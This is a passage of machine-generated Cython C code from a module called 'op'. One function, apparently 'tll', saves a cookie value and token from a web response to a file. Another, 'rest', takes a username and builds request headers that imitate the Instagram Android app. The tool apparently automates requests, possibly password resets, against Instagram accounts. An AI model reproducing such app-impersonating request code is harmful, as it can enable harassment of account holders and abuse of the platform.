__pyx_t_6 = PyUnicode_Split(((PyObject*)__pyx_t_12), __Pyx_NoneAsNull(__pyx_mstate_global->__pyx_kp_u_null), -1L); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 152, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\n      __pyx_t_12 = __Pyx_GetItemInt_List(__pyx_t_6, 1, long, 1, __Pyx_PyLong_From_long, 1, 0, 1, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 152, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_12);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __pyx_t_4 = __pyx_t_12;\n      __Pyx_INCREF(__pyx_t_4);\n      __pyx_t_9 = 0;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_mstate_global->__pyx_kp_u__6};\n        __pyx_t_7 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_split, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\n        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 152, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_7);\n      }\n      __pyx_t_12 = __Pyx_GetItemInt(__pyx_t_7, 0, long, 1, __Pyx_PyLong_From_long, 0, 0, 1, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 152, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_12);\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __pyx_v_tl = __pyx_t_12;\n      __pyx_t_12 = 0;\n\n      \n      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_mstate_global->__pyx_n_u_cookies); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 153, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_t_7 = __pyx_t_4;\n      __Pyx_INCREF(__pyx_t_7);\n      __pyx_t_9 = 0;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_7, NULL};\n        __pyx_t_12 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_get_dict, __pyx_callargs+__pyx_t_9, (1-__pyx_t_9) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n        if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 153, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_12);\n      }\n      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_12, __pyx_mstate_global->__pyx_kp_u_Host_GAPS); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 153, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\n      __Pyx_DECREF_SET(__pyx_v_host, __pyx_t_4);\n      __pyx_t_4 = 0;\n\n      \n       {\n        __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 154, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_4);\n        if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_encoding, __pyx_mstate_global->__pyx_kp_u_utf_8) < (0)) __PYX_ERR(0, 154, __pyx_L3_error)\n        __pyx_t_12 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_mstate_global->__pyx_tuple[4], __pyx_t_4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 154, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_12);\n        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_12, __pyx_mstate_global->__pyx_n_u_exit); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 154, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_13);\n        __pyx_t_7 = NULL;\n        __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_12, __pyx_mstate_global->__pyx_n_u_enter); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 154, __pyx_L9_error)\n        __Pyx_GOTREF(__pyx_t_6);\n        __pyx_t_9 = 1;\n        #if CYTHON_UNPACK_METHODS\n        if (likely(PyMethod_Check(__pyx_t_6))) {\n          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);\n          assert(__pyx_t_7);\n          PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_6);\n          __Pyx_INCREF(__pyx_t_7);\n          __Pyx_INCREF(__pyx__function);\n          __Pyx_DECREF_SET(__pyx_t_6, __pyx__function);\n          __pyx_t_9 = 0;\n        }\n        #endif\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_7, NULL};\n          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+__pyx_t_9, (1-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 154, __pyx_L9_error)\n          __Pyx_GOTREF(__pyx_t_4);\n        }\n        __pyx_t_6 = __pyx_t_4;\n        __pyx_t_4 = 0;\n        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\n         {\n          {\n            __Pyx_PyThreadState_declare\n            __Pyx_PyThreadState_assign\n            __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);\n            __Pyx_XGOTREF(__pyx_t_14);\n            __Pyx_XGOTREF(__pyx_t_15);\n            __Pyx_XGOTREF(__pyx_t_16);\n             {\n              __pyx_v_f = __pyx_t_6;\n              __pyx_t_6 = 0;\n\n              \n              __pyx_t_12 = __pyx_v_f;\n              __Pyx_INCREF(__pyx_t_12);\n              __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_tl, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 155, __pyx_L13_error)\n              __Pyx_GOTREF(__pyx_t_4);\n              __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_host, __pyx_mstate_global->__pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 155, __pyx_L13_error)\n              __Pyx_GOTREF(__pyx_t_7);\n              __pyx_t_17[0] = __pyx_t_4;\n              __pyx_t_17[1] = __pyx_mstate_global->__pyx_kp_u__7;\n              __pyx_t_17[2] = __pyx_t_7;\n              __pyx_t_17[3] = __pyx_mstate_global->__pyx_kp_u__8;\n              __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_17, 4, __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4) + 2 + __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7) + 1, 127 | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) | __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7));\n              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 155, __pyx_L13_error)\n              __Pyx_GOTREF(__pyx_t_5);\n              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n              __pyx_t_9 = 0;\n              {\n                PyObject *__pyx_callargs[2] = {__pyx_t_12, __pyx_t_5};\n                __pyx_t_6 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_write, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n                __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n                if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 155, __pyx_L13_error)\n                __Pyx_GOTREF(__pyx_t_6);\n              }\n              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n              \n            }\n            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\n            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;\n            goto __pyx_L18_try_end;\n            __pyx_L13_error:;\n            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n             {\n              __Pyx_AddTraceback("op.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);\n              if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_5, &__pyx_t_12) < 0) __PYX_ERR(0, 154, __pyx_L15_except_error)\n              __Pyx_XGOTREF(__pyx_t_6);\n              __Pyx_XGOTREF(__pyx_t_5);\n              __Pyx_XGOTREF(__pyx_t_12);\n              __pyx_t_7 = PyTuple_Pack(3, __pyx_t_6, __pyx_t_5, __pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 154, __pyx_L15_except_error)\n              __Pyx_GOTREF(__pyx_t_7);\n              __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_t_7, NULL);\n              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;\n              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n              if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 154, __pyx_L15_except_error)\n              __Pyx_GOTREF(__pyx_t_18);\n              __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);\n              __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;\n              if (__pyx_t_19 < (0)) __PYX_ERR(0, 154, __pyx_L15_except_error)\n              __pyx_t_20 = (!__pyx_t_19);\n              if (unlikely(__pyx_t_20)) {\n                __Pyx_GIVEREF(__pyx_t_6);\n                __Pyx_GIVEREF(__pyx_t_5);\n                __Pyx_XGIVEREF(__pyx_t_12);\n                __Pyx_ErrRestoreWithState(__pyx_t_6, __pyx_t_5, __pyx_t_12);\n                __pyx_t_6 = 0;  __pyx_t_5 = 0;  __pyx_t_12 = 0; \n                __PYX_ERR(0, 154, __pyx_L15_except_error)\n              }\n              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n              __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n              goto __pyx_L14_exception_handled;\n            }\n            __pyx_L15_except_error:;\n            __Pyx_XGIVEREF(__pyx_t_14);\n            __Pyx_XGIVEREF(__pyx_t_15);\n            __Pyx_XGIVEREF(__pyx_t_16);\n            __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);\n            goto __pyx_L3_error;\n            __pyx_L14_exception_handled:;\n            __Pyx_XGIVEREF(__pyx_t_14);\n            __Pyx_XGIVEREF(__pyx_t_15);\n            __Pyx_XGIVEREF(__pyx_t_16);\n            __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);\n            __pyx_L18_try_end:;\n          }\n        }\n         {\n          {\n            if (__pyx_t_13) {\n              __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_mstate_global->__pyx_tuple[5], NULL);\n              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;\n              if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 154, __pyx_L3_error)\n              __Pyx_GOTREF(__pyx_t_16);\n              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;\n            }\n            goto __pyx_L12;\n          }\n          __pyx_L12:;\n        }\n        goto __pyx_L22;\n        __pyx_L9_error:;\n        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;\n        goto __pyx_L3_error;\n        __pyx_L22:;\n      }\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    goto __pyx_L8_try_end;\n    __pyx_L3_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n\n    \n    __pyx_t_21 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(((PyTypeObject*)PyExc_Exception))));\n    if (__pyx_t_21) {\n      __Pyx_AddTraceback("op.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_12, &__pyx_t_5, &__pyx_t_6) < 0) __PYX_ERR(0, 156, __pyx_L5_except_error)\n      __Pyx_XGOTREF(__pyx_t_12);\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_6);\n      __Pyx_INCREF(__pyx_t_5);\n      __pyx_v_e = __pyx_t_5;\n       {\n\n        \n        __pyx_t_4 = NULL;\n        __Pyx_INCREF(__pyx_builtin_print);\n        __pyx_t_10 = __pyx_builtin_print; \n        __pyx_t_9 = 1;\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_v_e};\n          __pyx_t_7 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_9, (2-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L28_error)\n          __Pyx_GOTREF(__pyx_t_7);\n        }\n        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n\n        \n        __pyx_t_10 = NULL;\n        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_tll); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 158, __pyx_L28_error)\n        __Pyx_GOTREF(__pyx_t_4);\n        __pyx_t_9 = 1;\n        #if CYTHON_UNPACK_METHODS\n        if (unlikely(PyMethod_Check(__pyx_t_4))) {\n          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);\n          assert(__pyx_t_10);\n          PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_4);\n          __Pyx_INCREF(__pyx_t_10);\n          __Pyx_INCREF(__pyx__function);\n          __Pyx_DECREF_SET(__pyx_t_4, __pyx__function);\n          __pyx_t_9 = 0;\n        }\n        #endif\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};\n          __pyx_t_7 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+__pyx_t_9, (1-__pyx_t_9) | (__pyx_t_9*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 158, __pyx_L28_error)\n          __Pyx_GOTREF(__pyx_t_7);\n        }\n        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      }\n\n      \n       {\n        {\n          __Pyx_DECREF(__pyx_v_e); __pyx_v_e = 0;\n          goto __pyx_L29;\n        }\n        __pyx_L28_error:;\n        {\n          __Pyx_PyThreadState_declare\n          __Pyx_PyThreadState_assign\n          __pyx_t_13 = 0; __pyx_t_16 = 0; __pyx_t_15 = 0; __pyx_t_14 = 0; __pyx_t_18 = 0; __pyx_t_24 = 0;\n          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n           __Pyx_ExceptionSwap(&__pyx_t_14, &__pyx_t_18, &__pyx_t_24);\n          if ( unlikely(__Pyx_GetException(&__pyx_t_13, &__pyx_t_16, &__pyx_t_15) < 0)) __Pyx_ErrFetch(&__pyx_t_13, &__pyx_t_16, &__pyx_t_15);\n          __Pyx_XGOTREF(__pyx_t_13);\n          __Pyx_XGOTREF(__pyx_t_16);\n          __Pyx_XGOTREF(__pyx_t_15);\n          __Pyx_XGOTREF(__pyx_t_14);\n          __Pyx_XGOTREF(__pyx_t_18);\n          __Pyx_XGOTREF(__pyx_t_24);\n          __pyx_t_21 = __pyx_lineno; __pyx_t_22 = __pyx_clineno; __pyx_t_23 = __pyx_filename;\n          {\n            __Pyx_DECREF(__pyx_v_e); __pyx_v_e = 0;\n          }\n          __Pyx_XGIVEREF(__pyx_t_14);\n          __Pyx_XGIVEREF(__pyx_t_18);\n          __Pyx_XGIVEREF(__pyx_t_24);\n          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_18, __pyx_t_24);\n          __Pyx_XGIVEREF(__pyx_t_13);\n          __Pyx_XGIVEREF(__pyx_t_16);\n          __Pyx_XGIVEREF(__pyx_t_15);\n          __Pyx_ErrRestore(__pyx_t_13, __pyx_t_16, __pyx_t_15);\n          __pyx_t_13 = 0; __pyx_t_16 = 0; __pyx_t_15 = 0; __pyx_t_14 = 0; __pyx_t_18 = 0; __pyx_t_24 = 0;\n          __pyx_lineno = __pyx_t_21; __pyx_clineno = __pyx_t_22; __pyx_filename = __pyx_t_23;\n          goto __pyx_L5_except_error;\n        }\n        __pyx_L29:;\n      }\n      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n      goto __pyx_L4_exception_handled;\n    }\n    goto __pyx_L5_except_error;\n\n    \n    __pyx_L5_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_2);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);\n    goto __pyx_L1_error;\n    __pyx_L4_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_2);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);\n    __pyx_L8_try_end:;\n  }\n\n  \n\n  \n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_7);\n  __Pyx_XDECREF(__pyx_t_8);\n  __Pyx_XDECREF(__pyx_t_10);\n  __Pyx_XDECREF(__pyx_t_12);\n  __Pyx_AddTraceback("op.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_n1);\n  __Pyx_XDECREF(__pyx_v_n2);\n  __Pyx_XDECREF(__pyx_v_host);\n  __Pyx_XDECREF(__pyx_v_he3);\n  __Pyx_XDECREF(__pyx_v_res1);\n  __Pyx_XDECREF(__pyx_v_tok);\n  __Pyx_XDECREF(__pyx_v_cookies);\n  __Pyx_XDECREF(__pyx_v_headers);\n  __Pyx_XDECREF(__pyx_v_data);\n  __Pyx_XDECREF(__pyx_v_response);\n  __Pyx_XDECREF(__pyx_v_tl);\n  __Pyx_XDECREF(__pyx_v_f);\n  __Pyx_XDECREF(__pyx_v_e);\n  __Pyx_XDECREF(__pyx_gb_2op_3tll_2generator);\n  __Pyx_XDECREF(__pyx_gb_2op_3tll_5generator1);\n  __Pyx_XDECREF(__pyx_gb_2op_3tll_8generator2);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\n\nstatic PyObject *__pyx_pw_2op_5rest(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n); \nstatic PyMethodDef __pyx_mdef_2op_5rest = {"rest", (PyCFunction)(void(*)(void))(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_2op_5rest, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};\nstatic PyObject *__pyx_pw_2op_5rest(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n) {\n  PyObject *__pyx_v_user = 0;\n  #if !CYTHON_METH_FASTCALL\n  CYTHON_UNUSED Py_ssize_t __pyx_nargs;\n  #endif\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject* values[1] = {0};\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("rest (wrapper)", 0);\n  #if !CYTHON_METH_FASTCALL\n  #if CYTHON_ASSUME_SAFE_SIZE\n  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);\n  #else\n  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;\n  #endif\n  #endif\n  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);\n  {\n    PyObject ** const __pyx_pyargnames[] = {&__pyx_mstate_global->__pyx_n_u_user,0};\n    const Py_ssize_t __pyx_kwds_len = (__pyx_kwds) ? __Pyx_NumKwargs_FASTCALL(__pyx_kwds) : 0;\n    if (unlikely(__pyx_kwds_len) < 0) __PYX_ERR(0, 164, __pyx_L3_error)\n    if (__pyx_kwds_len > 0) {\n      switch (__pyx_nargs) {\n        case  1:\n        values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n        if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 164, __pyx_L3_error)\n        CYTHON_FALLTHROUGH;\n        case  0: break;\n        default: goto __pyx_L5_argtuple_error;\n      }\n      const Py_ssize_t kwd_pos_args = __pyx_nargs;\n      if (__Pyx_ParseKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values, kwd_pos_args, __pyx_kwds_len, "rest", 0) < (0)) __PYX_ERR(0, 164, __pyx_L3_error)\n      for (Py_ssize_t i = __pyx_nargs; i < 1; i++) {\n        if (unlikely(!values[i])) { __Pyx_RaiseArgtupleInvalid("rest", 1, 1, 1, i); __PYX_ERR(0, 164, __pyx_L3_error) }\n      }\n    } else if (unlikely(__pyx_nargs != 1)) {\n      goto __pyx_L5_argtuple_error;\n    } else {\n      values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n      if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 164, __pyx_L3_error)\n    }\n    __pyx_v_user = values[0];\n  }\n  goto __pyx_L6_skip;\n  __pyx_L5_argtuple_error:;\n  __Pyx_RaiseArgtupleInvalid("rest", 1, 1, 1, __pyx_nargs); __PYX_ERR(0, 164, __pyx_L3_error)\n  __pyx_L6_skip:;\n  goto __pyx_L4_argument_unpacking_done;\n  __pyx_L3_error:;\n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_AddTraceback("op.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __Pyx_RefNannyFinishContext();\n  return NULL;\n  __pyx_L4_argument_unpacking_done:;\n  __pyx_r = __pyx_pf_2op_4rest(__pyx_self, __pyx_v_user);\n\n  \n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_pf_2op_4rest(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user) {\n  PyObject *__pyx_v_headers = NULL;\n  PyObject *__pyx_v_data = NULL;\n  PyObject *__pyx_v_response = NULL;\n  PyObject *__pyx_v_r = NULL;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  PyObject *__pyx_t_9 = NULL;\n  size_t __pyx_t_10;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("rest", 0);\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_2);\n    __Pyx_XGOTREF(__pyx_t_3);\n     {\n\n      \n      __pyx_t_4 = __Pyx_PyDict_NewPresized(19); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 167, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_Pigeon_Session_Id, __pyx_mstate_global->__pyx_kp_u_50cc6861_7036_43b4_802e_fb428279) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_Pigeon_Rawclienttime, __pyx_mstate_global->__pyx_kp_u_1700251574_982) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_IG_Connection_Speed, __pyx_mstate_global->__pyx_kp_u_1kbps) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_IG_Bandwidth_Speed_KBPS, __pyx_mstate_global->__pyx_kp_u_1_000) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_IG_Bandwidth_TotalBytes_B, __pyx_mstate_global->__pyx_kp_u_0) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_IG_Bandwidth_TotalTime_MS, __pyx_mstate_global->__pyx_kp_u_0) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_Bloks_Version_Id, __pyx_mstate_global->__pyx_n_u_c80c5fb30dfae9e273e4009f03b18280) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_IG_Connection_Type, __pyx_mstate_global->__pyx_n_u_WIFI) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_IG_Capabilities, __pyx_mstate_global->__pyx_kp_u_3brTvw) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_IG_App_ID, __pyx_mstate_global->__pyx_kp_u_567067343352427) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_User_Agent, __pyx_mstate_global->__pyx_kp_u_Instagram_100_0_0_17_129_Android) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_Accept_Language, 